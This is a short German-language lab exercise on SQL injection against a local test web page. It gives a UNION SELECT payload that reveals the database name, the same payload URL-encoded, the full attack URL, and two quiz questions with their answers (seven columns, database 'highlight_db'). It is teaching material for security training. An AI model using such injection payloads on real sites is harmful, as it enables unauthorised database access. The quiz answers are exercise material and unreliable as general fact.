Beginnen Sie wie bei der vorherigen Webseite damit, den Namen der Datenbank und die Spaltenanzahl der betroffenen Tabelle herauszufinden.
Encodieren Sie Ihr Injection-Statement dazu im URL-Format und kopieren Sie es in die Adresszeile.

' AND 1=0 UNION SELECT 0,0,0,0,0,database(),0;--
'%20AND%201%3D0%20UNION%20SELECT%200%2C0%2C0%2C0%2C0%2Cdatabase()%2C0%3B--%20
http://localhost:82/index.php?id=2%27%20AND%201%3D0%20UNION%20SELECT%200%2C0%2C0%2C0%2C0%2Cdatabase()%2C0%3B--%20

>>9) Wie viele Spalten enthält die Tabelle insgesamt?<<
=== 7

>>10) Wie lautet der Name der Datenbank?<<
=== highlight_db